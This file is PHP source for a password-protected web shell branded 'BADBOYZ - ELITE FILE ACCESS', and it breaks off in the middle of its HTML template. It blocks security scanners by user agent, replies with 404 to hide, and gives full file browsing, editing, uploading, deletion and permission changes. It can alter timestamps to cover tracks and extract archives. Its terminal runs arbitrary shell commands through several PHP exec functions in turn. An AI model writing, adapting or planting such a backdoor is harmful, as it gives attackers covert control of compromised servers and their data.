<?php
// ========== ANTI MALWARE / BADAI / MUTING BELIUNG / DLL ==========
$bad_bots = [
    'sqlmap', 'nikto', 'nmap', 'masscan', 'acunetix', 'netsparker',
    'havij', 'pangolin', 'whatweb', 'wpscan', 'dirbuster', 'gobuster',
    'hydra', 'medusa', 'metasploit', 'burpsuite', 'zap', 'paros',
    'morfeus', 'fimap', 'xsser', 'w3af', 'skipfish', 'arachni',
    'vega', 'grabber', 'ratproxy', 'wireshark', 'ettercap',
    'badai', 'mutingbeliung', 'putingbeliung', 'angin', 'tornado',
    'malware', 'virus', 'trojan', 'backdoor', 'rootkit', 'keylogger',
    'ransomware', 'worm', 'spyware', 'adware', 'phishing'
];
$ua_check = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
foreach ($bad_bots as $bot) {
    if (strpos($ua_check, $bot) !== false) {
        header('HTTP/1.1 403 Forbidden');
        die('🚫 Akses ditolak! Terdeteksi aktivitas berbahaya.');
    }
}
$bad_referers = ['semalt', 'buttons-for-website', 'social-buttons', 'kambasoft', 'savetube'];
$ref_check = strtolower($_SERVER['HTTP_REFERER'] ?? '');
foreach ($bad_referers as $bad) {
    if (strpos($ref_check, $bad) !== false) {
        header('HTTP/1.1 403 Forbidden');
        die('🚫 Referer tidak valid!');
    }
}
if (!in_array($_SERVER['REQUEST_METHOD'], ['GET', 'POST'])) {
    header('HTTP/1.1 405 Method Not Allowed');
    die('🚫 Method tidak diizinkan!');
}
$ip_check = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$all_input_check = array_merge($_GET, $_POST, $_COOKIE);
$danger_patterns = [
    '/(\bunion\b.*\bselect\b)/i',
    '/(\bselect\b.*\bfrom\b.*\bwhere\b)/i',
    '/(\bdrop\b.*\btable\b)/i',
    '/(<script.*?>.*?<\/script>)/i',
    '/(<iframe.*?>)/i',
    '/(onerror\s*=)/i',
    '/(javascript\s*:)/i',
    '/(etc\/passwd)/i',
];
foreach ($all_input_check as $k => $v) {
    if (is_string($v)) {
        foreach ($danger_patterns as $p) {
            if (preg_match($p, $v)) {
                header('HTTP/1.1 403 Forbidden');
                die('🚫 Terdeteksi pola berbahaya!');
            }
        }
    }
}
// ========== END ANTI MALWARE ==========

@set_time_limit(0);
@ob_clean();
@http_response_code(404);
error_reporting(0);
session_start();

// === LOGOUT ===
if (isset($_GET['logout'])) {
    $_SESSION = [];
    if (ini_get("session.use_cookies")) {
        $params = session_get_cookie_params();
        setcookie(session_name(), '', time() - 42000,
            $params["path"], $params["domain"],
            $params["secure"], $params["httponly"]
        );
    }
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

$type = isset($_REQUEST['type']) ? $_REQUEST['type'] : '';
$path = isset($_REQUEST['path']) ? $_REQUEST['path'] : '';
$data = $_SERVER;
$website_path = $data['DOCUMENT_ROOT'];
$file_path = $data['SCRIPT_FILENAME'];
$now_path = dirname($file_path);
$web_url = $data['REQUEST_SCHEME'] . "://" . $data['SERVER_NAME'];
$hashed_password = '$2a$12$YBwPvUB67MbvFaT9BfPBzOFVBSL0fYYWX97UCSpbODqDvnN6/mGB.';

// === AUTH ===
if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    if (isset($_POST['password']) && password_verify($_POST['password'], $hashed_password)) {
        $_SESSION['loggedin'] = true;
    } else {
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>BADBOYZ - ELITE FILE ACCESS</title>
  <link rel="icon" type="image/png" href="https://s15.gifyu.com/images/bQ0b1.png">
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
  <style>
    *{margin:0;padding:0;box-sizing:border-box;}
    body{
      min-height:100vh;
      display:flex;
      align-items:center;
      justify-content:center;
      font-family:'JetBrains Mono',monospace;
      background:url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhS4-Ur1M0AF5_oQTYXjcC5MepAlGt3HKLc0QLHspmYQ7iTfln0SUtkSQak6AZ1-h_0yq6eOmbyfRRZJ1UMhUt8s_HQxjHqcULFe1ApCVRIOFWN8re-UBDV6yvGTR6uREN_MGGqBQnx-nKH5Sd1J-zbA_HOHhA1NW_o39Owk8Kbs213XOnxKdewVrk3R9Q/s736/kok.gif') no-repeat center center fixed;
      background-size:cover;
      position:relative;
    }
    body::before{
      content:'';
      position:fixed;
      inset:0;
      background:radial-gradient(circle at center, rgba(60,10,110,0.75), rgba(10,2,25,0.95));
      z-index:0;
      pointer-events:none;
    }
    .login-box{
      position:relative;
      z-index:1;
      background:rgba(25,8,55,0.88);
      backdrop-filter:blur(14px);
      -webkit-backdrop-filter:blur(14px);
      border:1px solid rgba(168,85,247,0.5);
      border-radius:16px;
      padding:3rem 2.5rem;
      width:480px;
      max-width:92vw;
      text-align:center;
      box-shadow:0 0 50px rgba(168,85,247,0.35), 0 0 100px rgba(124,58,237,0.2);
      animation:boxGlow 3s ease-in-out infinite;
    }
    @keyframes boxGlow{
      0%,100%{box-shadow:0 0 50px rgba(168,85,247,0.35), 0 0 100px rgba(124,58,237,0.2);}
      50%{box-shadow:0 0 70px rgba(192,132,252,0.5), 0 0 140px rgba(168,85,247,0.3);}
    }
    .login-logo{
      width:540px;
      height:auto;
      max-width:100%;
      margin:0 auto 1.2rem;
      display:block;
      filter:drop-shadow(0 0 15px #a855f7) drop-shadow(0 0 30px #7c3aed);
      animation:floatLogo 3s ease-in-out infinite;
    }
    @keyframes floatLogo{
      0%,100%{transform:translateY(0) scale(1);}
      50%{transform:translateY(-8px) scale(1.03);}
    }
    .login-box h1{color:#c084fc;font-size:1.8rem;margin-bottom:.5rem;letter-spacing:3px;text-shadow:0 0 12px #a855f7;}
    .login-box h2{font-size:1.1rem;letter-spacing:2px;margin-bottom:.2rem;font-weight:600;}
    .login-box h2:last-of-type{margin-bottom:1.8rem;}
    input[type=password]{
      width:100%;
      background:rgba(15,5,35,0.9);
      border:1px solid rgba(168,85,247,0.4);
      border-radius:6px;
      padding:.85rem 1.1rem;
      color:#e9d5ff;
      font-family:'JetBrains Mono',monospace;
      font-size:.9rem;
      outline:none;
      transition:border .2s, box-shadow .2s;
    }
    input[type=password]::placeholder{color:#a78bfa;opacity:0.6;}
    input[type=password]:focus{
      border-color:#a855f7;
      box-shadow:0 0 18px rgba(168,85,247,0.45);
    }
    button{
      margin-top:1.2rem;
      width:100%;
      background:linear-gradient(45deg,#a855f7,#7c3aed);
      color:#fff;
      border:none;
      border-radius:6px;
      padding:.85rem;
      font-family:'JetBrains Mono',monospace;
      font-weight:700;
      font-size:.95rem;
      cursor:pointer;
      letter-spacing:2px;
      transition:opacity .2s, box-shadow .2s, transform .2s;
    }
    button:hover{opacity:.9;box-shadow:0 0 25px rgba(168,85,247,0.7);transform:translateY(-2px);}
  </style>
</head>
<body>
  <div class="login-box">
    <img src="https://s15.gifyu.com/images/bQjDP.png" alt="LOGO" class="login-logo">
    <h1>ELITE FILE ACCESS</h1>
    <h2><span style="color: #7800f8;">NEVER CLAIM</span></h2>
    <h2><span style="color: #7800f8;">WHAT YOU DIDN'T EARN</span></h2>
    <form method="post">
      <input type="password" name="password" placeholder="ENTER YOUR PASWORD" autofocus required>
      <button type="submit">LOGIN</button>
    </form>
  </div>
</body>
</html>
<?php
        exit;
    }
}

// === PATH SETUP ===
if (!empty($path)) {
    $file_path = $path;
    $now_path  = $path;
}
if ($type == 1) {
    $now_path = $path;
}
$file_path_array = explode('/', $file_path);
if (!is_dir($now_path)) {
    $now_path = dirname($now_path);
}
$can_read  = is_readable($now_path);
$can_write = is_writable($now_path);
$sy_path   = str_replace($website_path, '', $now_path);
$now_url   = $web_url . (strpos($now_path, $website_path) !== false ? $sy_path : '');

// === HELPER FUNCTIONS ===
function getFileSize($file_url) {
    $s = filesize($file_url);
    if ($s > 1048576) return round($s / 1048576, 2) . ' MB';
    if ($s > 1024)    return round($s / 1024, 2) . ' KB';
    return $s . ' B';
}

function getFilePermission($filename) {
    clearstatcache(true, $filename);
    $perms = fileperms($filename);
    if (($perms & 0xC000) === 0xC000)      $info = 's';
    elseif (($perms & 0xA000) === 0xA000)  $info = 'l';
    elseif (($perms & 0x8000) === 0x8000)  $info = '-';
    elseif (($perms & 0x6000) === 0x6000)  $info = 'b';
    elseif (($perms & 0x4000) === 0x4000)  $info = 'd';
    elseif (($perms & 0x2000) === 0x2000)  $info = 'c';
    elseif (($perms & 0x1000) === 0x1000)  $info = 'p';
    else                                    $info = 'u';
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

function getOwnerGroup($filename) {
    if (function_exists('posix_getpwuid') && function_exists('posix_getgrgid')) {
        $stat  = stat($filename);
        $owner = posix_getpwuid($stat['uid']);
        $group = posix_getgrgid($stat['gid']);
        return ($owner ? $owner['name'] : $stat['uid']) . ' / ' . ($group ? $group['name'] : $stat['gid']);
    }
    return '-';
}

function sortByFolder($now_path, $all_list) {
    $folders = $files = [];
    foreach ($all_list as $v) {
        if (is_dir($now_path . '/' . $v)) $folders[] = $v;
        else $files[] = $v;
    }
    sort($folders);
    sort($files);
    return array_merge($folders, $files);
}

function deleteDirectory($dir) {
    if (!file_exists($dir)) return true;
    if (!is_dir($dir))      return unlink($dir);
    foreach (scandir($dir) as $item) {
        if ($item === '.' || $item === '..') continue;
        if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) return false;
    }
    return rmdir($dir);
}

// === PROCESS ACTIONS ===
$alert       = '';
$old_chmod   = '';
$new_name    = '';
$new_content = '';

if ($type == 3) {
    $file_content   = isset($_REQUEST['file_content']) ? $_REQUEST['file_content'] : '';
    $content_result = file_put_contents($path, $file_content);
    $alert = ($content_result !== false)
        ? '<div class="alert alert-success">File content modified successfully!</div>'
        : '<div class="alert alert-danger">Failed to modify file content!</div>';
}

if ($type == 4 && !empty($_POST['file_new_name'])) {
    $file_new_name = $_POST['file_new_name'];
    if (rename($file_path, $now_path . '/' . $file_new_name)) {
        $alert     = '<div class="alert alert-success">Renamed successfully!</div>';
        $file_path = $now_path . '/' . $file_new_name;
    } else {
        $alert = '<div class="alert alert-danger">Failed to rename!</div>';
    }
}

if ($type == 5) {
    if (!empty($_POST['new_chmod'])) {
        $new_chmod = trim($_POST['new_chmod']);
        $alert = chmod($file_path, octdec($new_chmod))
            ? '<div class="alert alert-success">Permissions changed successfully!</div>'
            : '<div class="alert alert-danger">Failed to change permissions!</div>';
        $old_chmod = $new_chmod;
    } else {
        $permissions = fileperms($file_path);
        $old_chmod   = substr(sprintf('%o', $permissions), -4);
    }
}

if ($type == 6) {
    $new_name    = isset($_POST['new_name'])    ? trim($_POST['new_name'])  : '';
    $new_content = isset($_POST['new_content']) ? $_POST['new_content']     : '';
    if (!empty($new_name)) {
        if (is_file($now_path . '/' . $new_name)) {
            $alert = '<div class="alert alert-danger">File already exists!</div>';
        } else {
            $fp = fopen($now_path . '/' . $new_name, 'w');
            if ($fp) { fwrite($fp, $new_content); fclose($fp);
                $alert = '<div class="alert alert-success">File created successfully!</div>';
            } else {
                $alert = '<div class="alert alert-danger">Failed to create file!</div>';
            }
        }
    }
}

if ($type == 7) {
    $new_name = isset($_POST['new_name']) ? trim($_POST['new_name']) : '';
    if (!empty($new_name)) {
        $target_dir = $now_path . '/' . $new_name;
        if (is_dir($target_dir))     $alert = '<div class="alert alert-warning">Directory already exists!</div>';
        elseif (mkdir($target_dir))  $alert = '<div class="alert alert-success">Directory created successfully!</div>';
        else                         $alert = '<div class="alert alert-danger">Failed to create directory!</div>';
    }
}

if ($type == 8 && !empty($_POST['new_datetime'])) {
    $timestamp = strtotime(trim($_POST['new_datetime']));
    if ($timestamp === false)             $alert = '<div class="alert alert-danger">Invalid date/time format!</div>';
    elseif (touch($file_path,$timestamp)) $alert = '<div class="alert alert-success">Modification time changed!</div>';
    else                                  $alert = '<div class="alert alert-danger">Failed to change time!</div>';
}

if ($type == 9 && isset($_POST['extract_to'])) {
    $extract_to = trim($_POST['extract_to']);
    if (empty($extract_to)) $extract_to = $now_path;
    $zip = new ZipArchive();
    $result = $zip->open($file_path);
    if ($result === true) {
        $alert = $zip->extractTo($extract_to)
            ? '<div class="alert alert-success">Extracted to: ' . htmlspecialchars($extract_to) . '</div>'
            : '<div class="alert alert-danger">Failed to extract!</div>';
        $zip->close();
    } else {
        $alert = '<div class="alert alert-danger">Cannot open ZIP! Error: ' . $result . '</div>';
    }
}

if ($type == 10) {
    $target = $path;
    if (!empty($target) && file_exists($target)) {
        $del_result = is_dir($target) ? deleteDirectory($target) : unlink($target);
        $alert = $del_result
            ? '<div class="alert alert-success"><strong>' . htmlspecialchars(basename($target)) . '</strong> deleted!</div>'
            : '<div class="alert alert-danger">Failed to delete!</div>';
    } else {
        $alert = '<div class="alert alert-danger">Item not found!</div>';
    }
}

if ($type == '' || $type == 1) {
    if (isset($_POST['act']) && $_POST['act'] === 'del' && !empty($_POST['childcheck'])) {
        $count = $fail = 0;
        foreach ($_POST['childcheck'] as $v) {
            $res = is_dir($v) ? deleteDirectory($v) : unlink($v);
            $res ? $count++ : $fail++;
        }
        if ($count) $alert .= '<div class="alert alert-success">Deleted ' . $count . ' item(s)!</div>';
        if ($fail)  $alert .= '<div class="alert alert-danger">Failed to delete ' . $fail . ' item(s)!</div>';
    }
    if (isset($_POST['act']) && $_POST['act'] === 'upload' && !empty($_FILES['fileToUpload']['name'])) {
        $targetFile = $now_path . '/' . basename($_FILES['fileToUpload']['name']);
        if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $targetFile))
            $alert .= '<div class="alert alert-success">' . htmlspecialchars(basename($_FILES['fileToUpload']['name'])) . ' uploaded!</div>';
        else
            $alert .= '<div class="alert alert-danger">Upload failed!</div>';
    }
}

// === TERMINAL EXEC - DETEKSI 7 METHOD ===
if (isset($_POST['act']) && $_POST['act'] === 'exec' && !empty($_POST['cmd'])) {
    $cmd = trim($_POST['cmd']);
    $target_dir = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();

    if (is_dir($target_dir) && chdir($target_dir)) {
        $current_cwd = getcwd();
        $alert .= '<div class="alert alert-info small mb-2">';
        $alert .= 'Working dir: <code>' . htmlspecialchars($current_cwd) . '</code>';
        $alert .= '</div>';
    }

    $methods = ['system', 'exec', 'passthru', 'shell_exec', 'proc_open', 'popen'];
    $output = $exit_code = '';
    $used_method = '';

    foreach ($methods as $name) {
        if (!function_exists($name)) continue;

        ob_start();
        $start_time = microtime(true);

        switch ($name) {
            case 'system':
            case 'passthru':
                $exit_code = $name($cmd . ' 2>&1');
                $output = ob_get_contents();
                break;

            case 'exec':
                exec($cmd . ' 2>&1', $exec_out, $exit_code);
                $output = implode("\n", $exec_out);
                break;

            case 'shell_exec':
                $output = $name($cmd . ' 2>&1');
                break;

            case 'popen':
                $pipe = popen($cmd . ' 2>&1', 'r');
                if ($pipe) {
                    while (!feof($pipe)) $output .= fread($pipe, 4096);
                    $exit_code = pclose($pipe);
                }
                break;

            case 'proc_open':
                $descriptorspec = [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];
                $process = proc_open($cmd, $descriptorspec, $pipes, $target_dir, null);
                if (is_resource($process)) {
                    fclose($pipes[0]);
                    $output = stream_get_contents($pipes[1]);
                    fclose($pipes[1]); fclose($pipes[2]);
                    $exit_code = proc_close($process);
                }
                break;
        }

        ob_end_clean();
        if ((microtime(true) - $start_time) > 10) break;
        if (!empty($output) || $exit_code !== null) {
            $used_method = $name;
            $output = trim($output ?: 'Command executed (no output)');
            break;
        }
    }

    chdir(dirname(__FILE__));

    if ($used_method) {
        $alert .= '<div class="alert alert-success">';
        $alert .= '<pre>' . htmlspecialchars($output) . '</pre>';
        $alert .= '</div>';
    } else {
        $alert .= '<div class="alert alert-danger">';
        $alert .= 'No working exec method found!<br>';
        $alert .= 'Available: ' . implode(', ', array_filter(array_map(function($m) {
            return function_exists($m) ? $m : null;
        }, $methods)));
        $alert .= '</div>';
    }
}

$file_list = [];
if (is_dir($now_path)) {
    $file_list = sortByFolder($now_path, scandir($now_path));
}

$current_date = $current_time = '';
if ($type == 8 && file_exists($file_path)) {
    $ts = filemtime($file_path);
    $current_date = date('Y-m-d', $ts);
    $current_time = date('H:i:s', $ts);
}

$uname_full = php_uname('a');
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <title>BADBOYZ - ELITE FILE ACCESS</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="icon" type="image/png" href="https://s15.gifyu.com/images/bQ0b1.png">
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Oxanium:wght@700;800&display=swap" rel="stylesheet">
  <style>
    *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }

    :root {
      --bg:       #0a0219;
      --bg2:      #150826;
      --bg3:      #1e083c;
      --border:   #2d1050;
      --border2:  #4c1d95;
      --text:     #e9d5ff;
      --text-dim: #a78bfa;
      --accent:   #a855f7;
      --accent2:  #c084fc;
      --danger:   #ff4d4d;
      --warn:     #d8b4fe;
      --folder:   #d8b4fe;
      --mono:     'JetBrains Mono', monospace;
      --sans:     'Oxanium', sans-serif;
    }

    body {
      background: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhS4-Ur1M0AF5_oQTYXjcC5MepAlGt3HKLc0QLHspmYQ7iTfln0SUtkSQak6AZ1-h_0yq6eOmbyfRRZJ1UMhUt8s_HQxjHqcULFe1ApCVRIOFWN8re-UBDV6yvGTR6uREN_MGGqBQnx-nKH5Sd1J-zbA_HOHhA1NW_o39Owk8Kbs213XOnxKdewVrk3R9Q/s736/kok.gif') no-repeat center center fixed;
      background-size: cover;
      color: var(--text);
      font-family: var(--mono);
      font-size: 13px;
      min-height: 100vh;
      position: relative;
    }
    body::before {
      content: '';
      position: fixed;
      inset: 0;
      background: linear-gradient(135deg, rgba(10,2,25,0.9) 0%, rgba(35,10,65,0.88) 100%);
      z-index: -1;
      pointer-events: none;
    }

    a { color: var(--accent2); text-decoration: none; }
    a:hover { color: var(--accent); }

    /* ===== LAYOUT ===== */
    .layout {
      display: flex;
      min-height: 100vh;
      position: relative;
      z-index: 1;
    }

    /* ===== SIDEBAR ===== */
    .sidebar {
      width: 240px;
      min-width: 240px;
      background: rgba(21,8,38,0.88);
      backdrop-filter: blur(10px);
      -webkit-backdrop-filter: blur(10px);
      border-right: 1px solid var(--border);
      display: flex;
      flex-direction: column;
      position: sticky;
      top: 0;
      height: 100vh;
      overflow-y: auto;
    }

    /* Logo */
    .sidebar-logo {
      font-family: var(--sans);
      font-size: 1.6rem;
      font-weight: 800;
      color: var(--accent);
      letter-spacing: 3px;
      padding: 1.2rem 1.3rem 1rem;
      border-bottom: 1px solid var(--border);
      display: flex;
      align-items: center;
      gap: .6rem;
    }
    .sidebar-logo img {
      width: 44px;
      height: 44px;
      object-fit: contain;
      filter: drop-shadow(0 0 8px var(--accent));
      animation: floatLogo 3s ease-in-out infinite;
    }
    @keyframes floatLogo {
      0%,100% { transform: translateY(0); }
      50%     { transform: translateY(-4px); }
    }
    .sidebar-logo span { color: var(--text-dim); font-size: .75rem; letter-spacing: 1px; }

    /* Section header */
    .sb-section { padding: 1rem 1.3rem .5rem; }
    .sb-section-title {
      font-size: 10px;
      letter-spacing: 2px;
      text-transform: uppercase;
      color: var(--text-dim);
      margin-bottom: .8rem;
      padding-bottom: .4rem;
      border-bottom: 1px solid var(--border);
    }

    /* Info rows */
    .info-row { margin-bottom: .9rem; }
    .info-key {
      font-size: 10px;
      color: var(--text-dim);
      text-transform: uppercase;
      letter-spacing: 1px;
      margin-bottom: .2rem;
    }
    .info-val {
      font-size: 13px;
      color: var(--text);
      font-weight: 600;
      word-break: break-all;
      line-height: 1.4;
    }
    .info-val.green  { color: var(--accent); }
    .info-val.blue   { color: var(--accent2); }

    /* uname box */
    .uname-box {
      background: rgba(10,2,25,0.7);
      border: 1px solid var(--border);
      border-radius: 4px;
      padding: .6rem .7rem;
      font-size: 11px;
      color: var(--accent2);
      word-break: break-all;
      line-height: 1.6;
      margin-top: .3rem;
    }

    .sidebar-spacer { flex: 1; }

    /* ===== MAIN ===== */
    .main {
      flex: 1;
      display: flex;
      flex-direction: column;
      min-width: 0;
    }

    /* ===== TOPBAR ===== */
    .topbar {
      background: rgba(30,8,60,0.92);
      backdrop-filter: blur(10px);
      -webkit-backdrop-filter: blur(10px);
      border-bottom: 1px solid var(--border2);
      padding: .5rem 1.4rem .55rem;
      font-size: 15px;
      position: sticky;
      top: 0;
      z-index: 10;
    }
    .topbar-path {
      display: flex;
      align-items: center;
      gap: .4rem;
      flex-wrap: wrap;
      margin-bottom: .4rem;
    }
    .topbar .label {
      font-size: 10px;
      color: var(--text-dim);
      text-transform: uppercase;
      letter-spacing: 1px;
      white-space: nowrap;
    }
    .topbar .sep { color: var(--border2); }
    .topbar .path-part a { color: var(--text); font-weight: 600; }
    .topbar .path-part a:hover { color: var(--accent); }

    .topbar-actions {
      display: flex;
      align-items: center;
      gap: .4rem;
      margin-bottom: .45rem;
    }

    .topbar-toolbar {
      display: flex;
      flex-direction: column;
      gap: .4rem;
      padding-top: .45rem;
      border-top: 1px solid var(--border);
    }
    .topbar-toolbar-row {
      display: flex;
      align-items: center;
      gap: .4rem;
      flex-wrap: wrap;
    }
    .topbar-toolbar form { display: flex; align-items: center; gap: .4rem; }

    .badge-rw {
      font-size: 15px;
      padding: .15rem .5rem;
      border-radius: 3px;
      font-weight: 700;
      letter-spacing: .5px;
    }
    .badge-ok   { background: rgba(168,85,247,.15); color: var(--accent); border: 1px solid rgba(168,85,247,.4); }
    .badge-fail { background: rgba(255,77,106,.12); color: var(--danger); border: 1px solid rgba(255,77,106,.3); }

    .home-btn {
      display: inline-flex;
      align-items: center;
      gap: .35rem;
      background: transparent;
      border: 1px solid var(--border2);
      border-radius: 4px;
      padding: .22rem .95rem;
      color: var(--accent);
      font-family: var(--mono);
      font-size: 15px;
      font-weight: 600;
      text-decoration: none;
      transition: background .15s, border-color .15s;
      white-space: nowrap;
    }
    .home-btn:hover {
      background: rgba(168,85,247,.12);
      border-color: var(--accent);
      color: var(--accent);
    }

    /* ===== BODY ===== */
    .zhyper-db-body { padding: 1.2rem 1.4rem; flex: 1; }

    /* ===== ALERTS ===== */
    .alert {
      padding: .6rem 1rem;
      border-radius: 5px;
      margin-bottom: .8rem;
      font-size: 12px;
      display: flex;
      align-items: center;
      gap: .5rem;
    }
    .alert-success { background: rgba(168,85,247,.12); color: var(--accent);  border: 1px solid rgba(168,85,247,.3); }
    .alert-danger  { background: rgba(255,77,106,.1); color: var(--danger);  border: 1px solid rgba(255,77,106,.25); }
    .alert-warning { background: rgba(216,180,254,.12); color: var(--warn);    border: 1px solid rgba(216,180,254,.3); }

    /* ===== BUTTONS ===== */
    .btn {
      display: inline-flex;
      align-items: center;
      gap: .3rem;
      padding: .35rem .75rem;
      border-radius: 4px;
      font-family: var(--mono);
      font-size: 13px;
      font-weight: 600;
      cursor: pointer;
      border: 1px solid transparent;
      text-decoration: none;
      transition: all .15s;
      white-space: nowrap;
    }
    .btn-accent { background:rgba(168,85,247,.18);  color:var(--accent);  border-color:rgba(168,85,247,.35);  }
    .btn-accent:hover { background:rgba(168,85,247,.3);  color:var(--accent);  }
    .btn-blue   { background:rgba(192,132,252,.18);  color:var(--accent2); border-color:rgba(192,132,252,.35);  }
    .btn-blue:hover   { background:rgba(192,132,252,.3);  color:var(--accent2); }
    .btn-warn   { background:rgba(216,180,254,.15); color:var(--warn);   border-color:rgba(216,180,254,.3); }
    .btn-warn:hover   { background:rgba(216,180,254,.28); color:var(--warn);   }
    .btn-danger { background:rgba(255,77,106,.15); color:var(--danger); border-color:rgba(255,77,106,.3); }
    .btn-danger:hover { background:rgba(255,77,106,.25); color:var(--danger); }
    .btn-ghost  { background:transparent; color:var(--text-dim); border-color:var(--border2); }
    .btn-ghost:hover  { color:var(--text); border-color:var(--text-dim); }
    .btn-upload { background:rgba(168,85,247,.12); color:var(--accent); border-color:rgba(168,85,247,.25); }
    .btn-upload:hover { background:rgba(168,85,247,.22); }
    .btn-logout { background:rgba(255,77,106,.12); color:#ff4d4d; border-color:rgba(255,77,106,.4); }
    .btn-logout:hover { background:rgba(255,77,106,.25); color:#ff4d4d; border-color:#ff4d4d; }

    input[type=file] {
      font-family: var(--mono);
      font-size: 12px;
      color: var(--text-dim);
      background: var(--bg3);
      border: 1px solid var(--border2);
      border-radius: 4px;
      padding: .3rem .5rem;
    }

    /* ===== TABLE ===== */
    .file-table-wrap { overflow-x: auto; }
    table { width:100%; border-collapse:collapse; font-size:12px; }
    thead tr { background: rgba(30,8,60,0.9); border-bottom:2px solid var(--border2); }
    thead th {
      padding: .65rem .75rem;
      color: var(--text-dim);
      font-weight: 600;
      text-align: left;
      white-space: nowrap;
      font-size: 11px;
      letter-spacing: .5px;
      text-transform: uppercase;
    }
    tbody tr { border-bottom:1px solid var(--border); transition:background .1s; }
    tbody tr:hover { background:rgba(168,85,247,.08); }
    tbody td { padding:.5rem .75rem; vertical-align:middle; }

    input[type=checkbox] { accent-color:var(--accent); width:13px; height:13px; cursor:pointer; }

    .fname-folder       { color:var(--folder); font-weight:600; }
    .fname-folder:hover { color:#e9d5ff; }
    .fname-file         { color:var(--text); }
    .fname-file:hover   { color:var(--accent2); }
    .folder-icon        { vertical-align:middle; margin-right:4px; }
    .size-dir           { color:var(--accent); font-weight:600; font-size:10px; }
    .mtime              { color:var(--text-dim); font-size:11px; }
    .owner              { color:var(--accent2); font-size:11px; }
    .owner-diff         { color: #ffffff; font-size: 11px; }
    .perm-ok            { color:var(--accent); font-weight:700; }
    .perm-fail          { color: #ffffff; font-weight:700; }
    .url-link           { color:var(--text-dim); font-size:11px; }
    .url-link:hover     { color:var(--accent2); }
    .actions            { display:flex; gap:.3rem; flex-wrap:wrap; }

    /* ===== FORM CARD ===== */
    .form-card {
      background: rgba(21,8,38,0.92);
      backdrop-filter: blur(10px);
      -webkit-backdrop-filter: blur(10px);
      border: 1px solid var(--border2);
      border-radius: 8px;
      padding: 1.5rem;
      max-width: 860px;
    }
    .form-card h4 {
      font-family: var(--sans);
      font-size: 1rem;
      color: #e9d5ff;
      margin-bottom: 1.2rem;
      padding-bottom: .6rem;
      border-bottom: 1px solid var(--border);
    }
    .form-card h4 span { color: var(--accent); }
    .form-group { margin-bottom: 1rem; }
    .form-group label {
      display: block;
      color: var(--text-dim);
      font-size: 11px;
      letter-spacing: .5px;
      text-transform: uppercase;
      margin-bottom: .4rem;
    }
    .form-control {
      width: 100%;
      background: rgba(10,2,25,0.85);
      border: 1px solid var(--border2);
      border-radius: 4px;
      padding: .55rem .85rem;
      color: var(--text);
      font-family: var(--mono);
      font-size: 12px;
      outline: none;
      transition: border-color .15s;
    }
    .form-control:focus { border-color: var(--accent); }
    textarea.form-control { resize: vertical; }
    .form-actions { display:flex; gap:.5rem; margin-top:1.2rem; }

    .empty-state { text-align:center; color:var(--text-dim); padding:2rem; font-size:12px; }

    ::-webkit-scrollbar { width:5px; height:5px; }
    ::-webkit-scrollbar-track { background:var(--bg2); }
    ::-webkit-scrollbar-thumb { background:var(--border2); border-radius:3px; }
    ::-webkit-scrollbar-thumb:hover { background:var(--text-dim); }

    .btn-exec { background:rgba(255,107,107,.15); color:#ff6b6b; border-color:rgba(255,107,107,.3); }
    .btn-exec:hover { background:rgba(255,107,107,.25); }
  </style>
</head>
<body>
<div class="layout">

  <!-- ===== SIDEBAR ===== -->
  <aside class="sidebar">
    <div class="sidebar-logo">
      <img src="https://s15.gifyu.com/images/bQ0b1.png" alt="LOGO">
      BADBOYZ
    </div>

    <div class="sb-section">
      <div class="sb-section-title">Server Info</div>

      <div class="info-row">
        <div class="info-key">IP Address</div>
        <div class="info-val green"><?php echo $data['SERVER_ADDR']; ?></div>
      </div>
      <div class="info-row">
        <div class="info-key">Software</div>
        <div class="info-val"><?php echo $data['SERVER_SOFTWARE']; ?></div>
      </div>
      <div class="info-row">
        <div class="info-key">Domains</div>
        <div class="info-val blue"><?php echo $data['HTTP_HOST']; ?></div>
      </div>
      <div class="info-row">
        <div class="info-key">User</div>
        <div class="info-val"><?php echo get_current_user(); ?></div>
      </div>
      <div class="info-row">
        <div class="info-key">PHP Version</div>
        <div class="info-val green"><?php echo PHP_VERSION; ?></div>
      </div>
    </div>

    <div class="sb-section">
      <div class="sb-section-title">OS / Kernel</div>
      <div class="info-row">
        <div class="uname-box"><?php echo htmlspecialchars($uname_full); ?></div>
      </div>
    </div>

    <div class="sidebar-spacer"></div>
  </aside>

  <!-- ===== MAIN ===== -->
  <div class="main">

    <!-- TOPBAR -->
    <div class="topbar">
      <div class="topbar-path">
        <span class="label">PATH</span>
        <?php
        $file_now_path = '';
        $file_now_url  = '';
        foreach ($file_path_array as $v) {
            if (empty($v)) {
                echo '<span class="path-part"><a href="?path=/">/</a></span>';
            } else {
                $file_now_url  = empty($file_now_url) ? $v : $file_now_url . '/' . $v;
